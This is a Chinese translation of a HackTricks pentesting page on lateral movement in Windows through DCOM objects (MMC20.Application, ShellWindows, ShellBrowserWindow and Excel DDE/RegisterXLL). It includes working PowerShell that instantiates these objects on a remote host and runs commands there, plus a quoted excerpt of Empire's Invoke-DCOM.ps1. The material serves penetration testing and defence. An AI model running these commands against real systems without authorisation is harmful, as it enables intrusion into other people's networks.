# DCOM Exec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## MMC20.Application

**DCOM**（分布式组件对象模型）对象由于能够通过网络与对象进行交互而变得**有趣**。微软在DCOM [这里](https://msdn.microsoft.com/en-us/library/cc226801.aspx) 和 COM [这里](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx) 有一些很好的文档。您可以使用PowerShell找到一个可靠的DCOM应用程序列表，运行`Get-CimInstance Win32_DCOMApplication`。

[MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) COM对象允许您脚本化MMC插件操作的组件。在枚举此COM对象中的不同方法和属性时，我注意到在Document.ActiveView下有一个名为`ExecuteShellCommand`的方法。

![](<../../.gitbook/assets/image (4) (2) (1) (1).png>)

您可以在[这里](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx)阅读有关该方法的更多信息。到目前为止，我们有一个可以通过网络访问并执行命令的DCOM应用程序。最后一步是利用这个DCOM应用程序和ExecuteShellCommand方法在远程主机上获得代码执行。

幸运的是，作为管理员，您可以使用PowerShell远程与DCOM进行交互，只需使用“`[activator]::CreateInstance([type]::GetTypeFromProgID`”。您只需要提供一个DCOM ProgID和一个IP地址。然后，它将远程提供给您该COM对象的一个实例：

![](<../../.gitbook/assets/image (665).png>)

然后，可以调用`ExecuteShellCommand`方法在远程主机上启动进程：

![](<../../.gitbook/assets/image (1) (4) (1).png>)

## ShellWindows和ShellBrowserWindow

**MMC20.Application**对象缺少显式的“[LaunchPermissions](https://technet.microsoft.com/en-us/library/bb633148.aspx)”，导致默认权限集允许管理员访问：

![](<../../.gitbook/assets/image (4) (1) (2).png>)

您可以在[这里](https://twitter.com/tiraniddo/status/817532039771525120)阅读更多关于该线程的信息。\
使用[@tiraniddo](https://twitter.com/tiraniddo)的[OleView .NET](https://github.com/tyranid/oleviewdotnet)可以查看没有显式LaunchPermission设置的其他对象，它具有出色的Python过滤器（以及其他功能）。在这种情况下，我们可以将过滤器缩小到所有没有显式Launch Permission的对象。这样做时，我注意到两个对象：`ShellBrowserWindow`和`ShellWindows`：

![](<../../.gitbook/assets/image (3) (1) (1) (2).png>)

识别潜在目标对象的另一种方法是查找`HKCR:\AppID\{guid}`中缺少`LaunchPermission`值的键。具有设置了Launch Permissions的对象将如下所示，其中数据表示对象的二进制格式的ACL：

![](https://enigma0x3.files.wordpress.com/2017/01/launch\_permissions\_registry.png?w=690\&h=169)

没有显式LaunchPermission设置的对象将缺少该特定的注册表项。

### ShellWindows

首先探索的对象是[ShellWindows](https://msdn.microsoft.com/en-us/library/windows/desktop/bb773974\(v=vs.85\).aspx)。由于此对象没有与之关联的[ProgID](https://msdn.microsoft.com/en-us/library/windows/desktop/ms688254\(v=vs.85\).aspx)，我们可以使用[Type.GetTypeFromCLSID](https://msdn.microsoft.com/en-us/library/system.type.gettypefromclsid\(v=vs.110\).aspx) .NET方法配对[Activator.CreateInstance](https://msdn.microsoft.com/en-us/library/system.activator.createinstance\(v=vs.110\).aspx)方法，通过其AppID在远程主机上实例化对象。为此，我们需要获取ShellWindows对象的[CLSID](https://msdn.microsoft.com/en-us/library/windows/desktop/ms691424\(v=vs.85\).aspx)，也可以使用OleView .NET完成：

![shellwindow\_classid](https://enigma0x3.files.wordpress.com/2017/01/shellwindow\_classid.png?w=434\&h=424)

如下所示，“Launch Permission”字段为空，表示没有设置显式权限。

![screen-shot-2017-01-23-at-4-12-24-pm](https://enigma0x3.files.wordpress.com/2017/01/screen-shot-2017-01-23-at-4-12-24-pm.png?w=455\&h=401)

现在，我们有了CLSID，可以在远程目标上实例化对象：
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>") #9BA05972-F6A8-11CF-A442-00A0C90A8F39
$obj = [System.Activator]::CreateInstance($com)
```
![](https://enigma0x3.files.wordpress.com/2017/01/remote\_instantiation\_shellwindows.png?w=690\&h=354)

在远程主机上实例化对象后，我们可以与其进行交互并调用任何方法。返回的对象句柄显示了几个方法和属性，但我们无法与其交互。为了实现与远程主机的实际交互，我们需要访问[WindowsShell.Item](https://msdn.microsoft.com/en-us/library/windows/desktop/bb773970\(v=vs.85\).aspx)方法，该方法将返回表示Windows shell窗口的对象：
```
$item = $obj.Item()
```
![](https://enigma0x3.files.wordpress.com/2017/01/item\_instantiation.png?w=416\&h=465)

掌握了Shell窗口的全部操作，我们现在可以访问所有预期的公开方法/属性。在浏览这些方法后，**`Document.Application.ShellExecute`** 引起了我的注意。请确保按照该方法的参数要求进行操作，这些要求在[这里](https://msdn.microsoft.com/en-us/library/windows/desktop/gg537745\(v=vs.85\).aspx)有详细说明。
```powershell
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
![](https://enigma0x3.files.wordpress.com/2017/01/shellwindows\_command\_execution.png?w=690\&h=426)

如上所示，我们的命令已成功在远程主机上执行。

### ShellBrowserWindow

这个特定的对象在Windows 7上不存在，使得它在横向移动方面的使用比“ShellWindows”对象有些受限，我在Win7-Win10上对其进行了测试并取得了成功。

根据我对该对象的枚举，它似乎有效地提供了与前一个对象相同的资源管理器窗口接口。要实例化这个对象，我们需要获取它的CLSID。与上面类似，我们可以使用OleView .NET：

![shellbrowser\_classid](https://enigma0x3.files.wordpress.com/2017/01/shellbrowser\_classid.png?w=428\&h=414)

再次注意空白的启动权限字段：

![screen-shot-2017-01-23-at-4-13-52-pm](https://enigma0x3.files.wordpress.com/2017/01/screen-shot-2017-01-23-at-4-13-52-pm.png?w=399\&h=340)

有了CLSID，我们可以重复上一个对象上的步骤来实例化对象并调用相同的方法：
```powershell
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "<IP>")
$obj = [System.Activator]::CreateInstance($com)

$obj.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\system32", $null, 0)
```
![](https://enigma0x3.files.wordpress.com/2017/01/shellbrowserwindow_command_execution.png?w=690\&h=441)

正如你所看到的，命令在远程目标上成功执行。

由于该对象直接与Windows shell进行交互，我们不需要调用“ShellWindows.Item”方法，就像之前的对象一样。

虽然这两个DCOM对象可以用于在远程主机上运行shell命令，但还有许多其他有趣的方法可以用于枚举或篡改远程目标。其中一些方法包括：

* `Document.Application.ServiceStart()`
* `Document.Application.ServiceStop()`
* `Document.Application.IsServiceRunning()`
* `Document.Application.ShutDownWindows()`
* `Document.Application.GetSystemInformation()`

## ExcelDDE和RegisterXLL

以类似的方式，可以滥用DCOM Excel对象进行横向移动，获取更多信息请阅读[https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
```powershell
# Chunk of code from https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1
## You can see here how to abuse excel for RCE
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
## 工具

Powershell脚本[**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1)可以轻松调用所有被注释的方法来在其他机器上执行代码。

## 参考资料

* 第一种方法来自[https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)，更多信息请点击链接
* 第二部分来自[https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)，更多信息请点击链接

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
